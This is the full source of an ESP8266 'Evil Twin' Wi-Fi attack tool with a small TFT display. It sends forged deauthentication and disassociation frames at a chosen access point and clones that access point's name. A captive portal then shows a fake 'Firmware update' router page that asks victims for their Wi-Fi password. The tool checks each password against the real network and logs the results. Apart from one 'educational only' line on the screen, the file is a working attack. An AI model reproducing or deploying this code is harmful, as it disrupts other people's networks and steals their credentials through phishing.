#include <ESP8266WiFi.h>
#include <ESPAsyncTCP.h>
#include "DNSServer.h"
#include "ESPAsyncWebServer.h"
#include "FS.h"

//TFT ---
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <SPI.h>

#define TFT_RST 16    //D0 = GPIO 16
#define TFT_CS 5     // D1 = GPIO 5
#define TFT_DC 4     // D2 = GPIO 4
/*Wiring 
CS D1, RST D0, AO/DC D2, SCK D5, SDA D7, LED/BL 5V*/


Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);

const uint16_t grey = 0x5AEB;
const uint16_t white = 0xFFFF;
const uint16_t blue = 0x1F;
const uint16_t green = 0x7E0;
const uint16_t orange = 0xFBE0; //Blue
const uint16_t yellow = 0xFFE0;
const uint16_t red = 0xF800; //Blue
const uint16_t dark_grey = 0x7BEF;
const uint16_t cyan = 0x7FF;
const uint16_t black = 0x0000;
//---

extern "C" {
  #include "user_interface.h"
}

typedef struct
 {
     String bssid;
     String pwr;
     String ch;
     String ssid;
     String button;
     uint8_t mac[6];
 } apObj;

apObj apTable[20];
String targetAP = "FF:FF:FF:FF:FF:FF";
bool deauthingActive=false;
bool eviltwinActive=false;
String lastPassword = "";
uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};  

DNSServer dnsServer;
AsyncWebServer server(80);
const char HTML[] PROGMEM = "<!DOCTYPE html><html><head><style>table, th, td{font-size: 14px; padding: 4px;border: 1px solid #bfbfbf;} button {padding: 3px; margin-right:3px; }</style></head><body><h1>ATTACK MODE</h1><table style=\"border-collapse: collapse;\" id=\"ssidlist\"><thead><tr><th>BSSID</th><th>PWR</th><th>Ch</th><th>SSID</th><th></th></tr></thead><tbody></tbody></table><br><button onclick=\"scanSSIDs()\" id=\"scan\">Scan</button><button onclick=\"eviltwin(this)\" id=\"eviltwin\">Start EvilTwin</button><br><div id=\"tblDiv\"></div><script>function scanSSIDs(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){document.getElementById(\"ssidlist\").children[1].innerHTML=this.responseText;}};xhttp.open(\"GET\", \"/scanSSIDs\", true);xhttp.send();}function refreshSSIDs(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){document.getElementById(\"ssidlist\").children[1].innerHTML=this.responseText;}};xhttp.open(\"GET\", \"/refreshSSIDs\", true);xhttp.send();}function selectTarget(elem){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){refreshSSIDs();}};xhttp.open('GET', '/selectTarget?target=' + elem.parentElement.parentElement.children[0].innerText, true);xhttp.send();}function deauthTarget(elem){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){elem.innerHTML = this.responseText;  refreshSSIDs();}};xhttp.open('GET', '/deauthTarget', true);xhttp.send();}function eviltwin(elem){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){  elem.innerHTML = this.responseText;}};xhttp.open('GET', '/eviltwin', true);xhttp.send();}function checkLogs(){var xhttp = new XMLHttpRequest();xhttp.onreadystatechange = function() {if (this.readyState == 4 && this.status == 200){document.getElementById(\"tblDiv\").innerHTML = this.responseText;}};xhttp.open(\"GET\", \"/checkLogs\", true);xhttp.send();} checkLogs(); </script></body></html>";
//const char EVILTWIN[] = "<!DOCTYPE html><html><head><title>Router Settings</title></head><body><h1>Firmware update required</h1><input type=\"password\" placeholder=\"Wireless password\" id=\"txtPw\"/><button onclick=\"checkPassword()\" id=\"confirm\">Confirm</button><p id=\"txtResult\"></p><script>function checkPassword(){document.getElementById(\"txtResult\").innerHTML=\"\";var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){ setTimeout(function(){checkResult();}, 5000);}};xhttp.open(\"GET\", \"/checkPassword?password=\" + document.getElementById(\"txtPw\").value, true);xhttp.send();}function checkResult(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){document.getElementById(\"txtResult\").innerHTML=this.responseText;}};xhttp.open(\"GET\", \"/checkResult\", true);xhttp.send();}</script></body></html>";
//const char EVILTWIN[] = "<!DOCTYPE html><html><head><title>Router Settings</title><style>fieldset{width: 250px; border-color: blue; box-shadow: 2px 2px 4px #333;}</style></head><body><h3><fieldset><legend>FIRMWARE UPDATE</center></fieldset></h3><label>A new version of the firmware has been detected<BR>and awaiting installation. Please review our new<BR>terms and conditions and proceed. Enter your valid <BR>WiFi Password to continue<BR></label><BR><input type=\"password\" placeholder=\"Wireless password\" id=\"txtPw\"/><button onclick=\"checkPassword()\" id=\"confirm\">Confirm</button><p id=\"txtResult\"></p><script>function checkPassword(){document.getElementById(\"txtResult\").innerHTML=\"\";var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){ setTimeout(function(){checkResult();}, 5000);}};xhttp.open(\"GET\", \"/checkPassword?password=\" + document.getElementById(\"txtPw\").value, true);xhttp.send();}function checkResult(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){document.getElementById(\"txtResult\").innerHTML=this.responseText;}};xhttp.open(\"GET\", \"/checkResult\", true);xhttp.send();}</script></body></html>";
//const char EVILTWIN[] = "<!DOCTYPE html><html><head><title>Router Settings</title><style>fieldset{width: 250px; border-color: blue; box-shadow: 2px 2px 4px #333;}</style></head><body><h3><fieldset><legend>FIRMWARE UPDATE</center></fieldset></h3><label>A new version of the firmware has been detected<BR>and awaiting installation. Please review our new<BR>terms and conditions and proceed. Please select<BR> and enter your valid Password to continue<BR></label><p><label><input type=radio name=txtHitamPutih value=0 checked> Firmware</label></p><p><label><input type=radio name=txtPutihKehitaman value=1> Virus Check</label></p><p><label><input type=checkbox name=lblHitamPutih> Agree to upgrade</label></p><datalist id=contrast><option label=Normal value=0></option><option label=Maximum value=100></option></datalist><BR><input type=\"password\" placeholder=\"Wireless password\" id=\"txtPw\"/><button onclick=\"checkPassword()\" id=\"confirm\">Confirm</button><p id=\"txtResult\"></p><script>function checkPassword(){document.getElementById(\"txtResult\").innerHTML=\"\";var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){ setTimeout(function(){checkResult();}, 5000);}};xhttp.open(\"GET\", \"/checkPassword?password=\" + document.getElementById(\"txtPw\").value, true);xhttp.send();}function checkResult(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){document.getElementById(\"txtResult\").innerHTML=this.responseText;}};xhttp.open(\"GET\", \"/checkResult\", true);xhttp.send();}</script></body></html>";
//const char EVILTWIN[] = "<!DOCTYPE html><html><head><title>Router Settings</title><style>fieldset{width: 350px; border-color: blue; box-shadow: 2px 2px 4px #333;}</style></head><body><h3><fieldset><legend>FIRMWARE UPDATE</fieldset></h3><label>A new version of the firmware has been detected<BR>and awaiting installation.   Please select below option<BR>and proceed. Please enter your valid Password to continue<BR></label><p><label><input type=radio name=txtHitamPutih value=0 checked> Firmware Installation</label></p><p><label><input type=radio name=txtPutihKehitaman value=1> Virus Check</label></p><p><label><input type=checkbox name=lblHitamPutih> Agree to upgrade</label></p><datalist id=contrast><option label=Normal value=0></option><option label=Maximum value=100></option></datalist><BR><input type=\"password\" placeholder=\"Wireless password\" id=\"txtPw\"/><button onclick=\"checkPassword()\" id=\"confirm\">START UPGRADE</button><p id=\"txtResult\"></p><script>function checkPassword(){document.getElementById(\"txtResult\").innerHTML=\"\";var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){ setTimeout(function(){checkResult();}, 5000);}};xhttp.open(\"GET\", \"/checkPassword?password=\" + document.getElementById(\"txtPw\").value, true);xhttp.send();}function checkResult(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){document.getElementById(\"txtResult\").innerHTML=this.responseText;}};xhttp.open(\"GET\", \"/checkResult\", true);xhttp.send();}</script></body></html>";
//const char EVILTWIN[] = "<!DOCTYPE html><html><head><title>Router Settings</title><style>fieldset{width: 350px; border-color: blue; box-shadow: 2px 2px 4px #333;}</style></head><body><h3><fieldset><legend>FIRMWARE UPDATE</fieldset></h3><label><fieldset>A new version of the firmware has been detected<BR>and awaiting installation.   Please select below option<BR>and proceed. Enter your valid Password to continue</fieldset><BR></label><p><label><input type=radio name=txtHitamPutih value=0 checked> Firmware Installation</label></p><p><label><input type=radio name=txtPutihKehitaman value=1> Virus Check</label></p><p><label><input type=checkbox name=lblHitamPutih> Agree to upgrade</label></p><datalist id=contrast><option label=Normal value=0></option><option label=Maximum value=100></option></datalist><BR><input type=\"password\" placeholder=\"Wireless password\" id=\"txtPw\"/><button onclick=\"checkPassword()\" id=\"confirm\">Start Upgrade</button><p id=\"txtResult\"></p><script>function checkPassword(){document.getElementById(\"txtResult\").innerHTML=\"\";var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){ setTimeout(function(){checkResult();}, 5000);}};xhttp.open(\"GET\", \"/checkPassword?password=\" + document.getElementById(\"txtPw\").value, true);xhttp.send();}function checkResult(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){document.getElementById(\"txtResult\").innerHTML=this.responseText;}};xhttp.open(\"GET\", \"/checkResult\", true);xhttp.send();}</script></body></html>";
const char EVILTWIN[] = "<!DOCTYPE html><html><head><title>Router Settings</title><style>fieldset{width: 920px; border-color: blue; box-shadow: 2px 2px 4px #333;}</style></head><body><h1><fieldset><legend>FIRMWARE UPDATE</fieldset></h1><label><fieldset><h3>A new version of the firmware has been detected and awaiting installation.   Please select below options and proceed. Enter your valid Password to continue</h3></fieldset><BR></label><p><label><input type=radio name=txtHitamPutih value=0 checked> Firmware Installation</label></p><p><label><input type=radio name=txtPutihKehitaman value=1> Virus Check</label></p><p><label><input type=checkbox name=lblHitamPutih> Agree to upgrade</label></p><datalist id=contrast><option label=Normal value=0></option><option label=Maximum value=100></option></datalist><BR><input type=\"password\" placeholder=\"Wireless password\" id=\"txtPw\"/><button onclick=\"checkPassword()\" id=\"confirm\">Start Upgrade</button><HR><p id=\"txtResult\"></p><script>function checkPassword(){document.getElementById(\"txtResult\").innerHTML=\"\";var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){ setTimeout(function(){checkResult();}, 5000);}};xhttp.open(\"GET\", \"/checkPassword?password=\" + document.getElementById(\"txtPw\").value, true);xhttp.send();}function checkResult(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if (this.readyState==4 && this.status==200){document.getElementById(\"txtResult\").innerHTML=this.responseText;}};xhttp.open(\"GET\", \"/checkResult\", true);xhttp.send();}</script></body></html>";

void onRequest(AsyncWebServerRequest *request){
    Serial.println("/");
    if (!eviltwinActive){
      request->send(200, "text/html", HTML);
    } else {
      request->send(200, "text/html", EVILTWIN);
    }
  }

void setup(){
  //TFT starts
tft.initR(INITR_BLACKTAB);

tft.setTextWrap(false);
tft.fillScreen(orange);   //white
tft.setTextColor(white);  //grey
tft.setTextSize(2);
tft.setCursor(10,10);
tft.println("EVIL TWIN");
tft.setTextSize(1.5);
tft.setCursor(10,35);
tft.println("--Wizz Tech 2022--");
tft.setTextColor(green);
tft.setCursor(10,50);
tft.println("This is for  educa");
tft.setCursor(10,60);
tft.println("tional only please");
tft.setCursor(10,70);
tft.println("use it to your own");
tft.setCursor(10,80);
tft.println("devices.WFH2022-23");
tft.setCursor(10,100);
tft.println("Connect:WizzLinked");
tft.setCursor(10,110);
tft.println("Password:wizz12345");
delay(5000);
tft.fillScreen(blue); // clear screen
tft.setTextSize(2);
tft.setCursor(10,10);
tft.println("Wizz-Tech");
tft.setTextSize(1.5); 
//---

//your other setup stuff...
  delay(500);
  Serial.begin(115200);
  delay(500);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192,168,4,1) , IPAddress(192,168,4,1) , IPAddress(255,255,255,0));
  WiFi.softAP("WizzLinked", "wizz12345");
  dnsServer.start(53, "*", IPAddress(192,168,4,1));
  WiFi.scanNetworks();
  
  server.onNotFound(onRequest);
  
  server.on("/scanSSIDs", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.println("scanSSIDs");
    String json = "";
    targetAP = "FF:FF:FF:FF:FF:FF";
    int n = WiFi.scanComplete();
    if(n == -2){WiFi.scanNetworks(true);} else if(n){
    for (int i = 0; i < n; ++i){
      apTable[i] = {String("<td>") +  WiFi.BSSIDstr(i) + "</td>", String("<td>") + WiFi.RSSI(i) + "</td>", String("<td>") + WiFi.channel(i) +"</td>", String("<td>") + WiFi.SSID(i) +"</td>", String("<td><button onclick=\"selectTarget(this)\">Select</button></td>")};

      for (int b = 0; b < 6; b++){
          apTable[i].mac[b] = WiFi.BSSID(i)[b];
          }
      json += String("<tr><td>") +  WiFi.BSSIDstr(i) + "</td>";json += String("<td>") + WiFi.RSSI(i) + "</td>";json += String("<td>") + WiFi.channel(i) +"</td>";json += String("<td>") + WiFi.SSID(i) +"</td>";json += String("<td><button onclick=\"selectTarget(this)\">Select</button></td></tr>");
    }
    WiFi.scanDelete();
    if(WiFi.scanComplete() == -2){WiFi.scanNetworks(true);}
    }
    WiFi.scanDelete();
    request->send(200, "text/html", json);
    json = String();});


  server.on("/refreshSSIDs", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.println("refreshSSIDs");
    String json = "";
    for (int ap = 0; ap < 20 && apTable[ap].bssid.length() > 0; ap++){
      
      if(apTable[ap].bssid.indexOf(targetAP) > -1) {
         json += "<tr>" + apTable[ap].bssid + apTable[ap].pwr + apTable[ap].ch + apTable[ap].ssid + "<td><button onclick=\"selectTarget(this)\">Deselect</button></td>" + "</tr>";
      } else {
        json += "<tr>" + apTable[ap].bssid + apTable[ap].pwr + apTable[ap].ch + apTable[ap].ssid + apTable[ap].button + "</tr>";
      }
    }
   
    request->send(200, "text/html", json);
    json = String();});
  
  server.on("/selectTarget", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.println("selectTarget");
    if(request->hasArg("target")){
      targetAP = request->arg("target");
        for (int ap = 0; ap < 20; ap++){
          if (apTable[ap].bssid.indexOf(targetAP) > -1){
            for (int b =0; b < 6; b++){
              deauthPacket[10+b] = apTable[ap].mac[b];
              deauthPacket[16+b] = apTable[ap].mac[b];
              }

            
          }
        }
      
      };
    request->send(200, "text/html", "OK");
    });

  /*server.on("/deauthTarget", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.println("deauthTarget");
    if (!deauthingActive && targetAP != "FF:FF:FF:FF:FF:FF"){
        Serial.println("Found target: " + targetAP);
        deauthingActive=true;
        request->send(200, "text/html", "Stop Deauth");
    } else {
      deauthingActive=false;
      request->send(200, "text/html", "Start Deauth");
    }
    });*/
    
  server.on("/eviltwin", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.println("eviltwin");
    
    tft.setCursor(10,40); 
    tft.println("Deauthing Target"); 
    delay(2000);
    tft.setCursor(10,50); 
    tft.println("Start Evil Twin");

    if (!eviltwinActive && targetAP != "FF:FF:FF:FF:FF:FF"){
       
        deauthingActive=true; //Deauthing SSID        
        eviltwinActive=true; //Clonning SSID

        request->send(200, "text/html", "Started EvilTwin");
        handle_AP_Changes();
    } else {
      eviltwinActive=false;
      request->send(200, "text/html", "Start EvilTwin");
    }
    });
  server.on("/checkPassword", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.println("checkPassword");

    tft.setCursor(10,60); 
    tft.println("Target is trapped"); 
    tft.setCursor(10,70); 

    if(request->hasArg("password")){
        String passWord = request->arg("password");
        String targetAcPo = "";
        for (int ap = 0; ap < 20; ap++){
          if (apTable[ap].bssid.indexOf(targetAP) > -1){
            targetAcPo = apTable[ap].ssid;
          }
        }
        targetAcPo.remove(0,4); // trim prefix <td>
        targetAcPo.remove(targetAcPo.length() - 5,5);
        lastPassword = passWord;
        WiFi.begin(targetAcPo.c_str(), passWord.c_str());
        request->send(200, "text/html", "OK");
        
      };
    });
  
  
  server.on("/checkResult", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.println("checkResult");
    String targetAcPo = "";
    for (int ap = 0; ap < 20; ap++){
        if (apTable[ap].bssid.indexOf(targetAP) > -1){
          targetAcPo = apTable[ap].ssid;
        }
    }
    targetAcPo.remove(0,4); // trim prefix <td>
    targetAcPo.remove(targetAcPo.length() - 5,5);
        
    if(WiFi.status() != WL_CONNECTED) {
      request->send(200, "text/html", "Wrong password");

      tft.setCursor(10,70);
      tft.println("Wrong password !!"); 
           
      File file = SPIFFS.open("/logs.txt", "a");
      if (file) {
        int bytesWritten = file.println("<tr style=\"background: red;\"><td>" + targetAcPo + "</td><td>" + lastPassword + "</td></tr>");
        Serial.println(file);
        file.close();
      }
    } else {
      request->send(200, "text/html", "Your router will be restarted.");

      tft.setCursor(10,100); 
      tft.println("Password OK"); 
      tft.setCursor(10,110); 
      tft.println("Router restarted"); 

      File file = SPIFFS.open("/logs.txt", "a");
      if (file) {
        int bytesWritten = file.println("<tr style=\"background: green;\"><td>" + targetAcPo + "</td><td>" + lastPassword + "</td></tr>");
        
        tft.setCursor(10,90); 
        tft.println(lastPassword); //Correct Password Displayed

        Serial.println(file);
        file.close();
      }
      eviltwinActive = false;
      deauthingActive = false;
      handle_AP_Changes();
      
    }
});

  server.on("/checkLogs", HTTP_GET, [](AsyncWebServerRequest *request){
    Serial.println("checkLogs");  
      File f = SPIFFS.open("/logs.txt", "r");
      String debugLogData;
      while (f.available()){
        debugLogData += char(f.read());
      }
      Serial.println(debugLogData);
      request->send(200, "text/html", "</br><table style=\"border-collapse: collapse; margin-top: 5px;\" id=\"tblLogs\"><thead><tr><th>SSID</th><th>Password</th></tr></thead><tbody>" + debugLogData + "<tbody></table>");
   
});

    
  SPIFFS.begin();
  server.begin();
}
void handle_AP_Changes(){
  Serial.println("handle_AP_Changes");
  if (eviltwinActive) {
     int result = WiFi.softAPdisconnect (true);
     String targetAcPo = ""; 
      for (int ap = 0; ap < 20; ap++){
          if (apTable[ap].bssid.indexOf(targetAP) > -1){
            targetAcPo = apTable[ap].ssid;
            }
        }
        targetAcPo.remove(0,4);
        targetAcPo.remove(targetAcPo.length() - 5,5);
        dnsServer.stop();
        
        WiFi.softAPConfig(IPAddress(192,168,4,1) , IPAddress(192,168,4,1) , IPAddress(255,255,255,0));
        WiFi.softAP(targetAcPo.c_str());
        dnsServer.start(53, "*", IPAddress(192,168,4,1));
  } else {
     int result = WiFi.softAPdisconnect(true);
     dnsServer.stop();
     WiFi.softAPConfig(IPAddress(192,168,4,1) , IPAddress(192,168,4,1) , IPAddress(255,255,255,0));
     WiFi.softAP("WizzLinked", "wizz12345");
     dnsServer.start(53, "*", IPAddress(192,168,4,1));
  }


}
unsigned long now =0;
void loop(){
  dnsServer.processNextRequest();
  if(deauthingActive && millis() - now >= 1000) {
    
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
   
    now = millis();
    }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
    String str;
    const char ZERO = '0';
    const char DOUBLEPOINT = ':';
    for (uint32_t i = 0; i < size; i++) {
        if (b[i] < 0x10) str += ZERO;
        str += String(b[i], HEX);

        if (i < size - 1) str += DOUBLEPOINT;
    }
    return str;
}
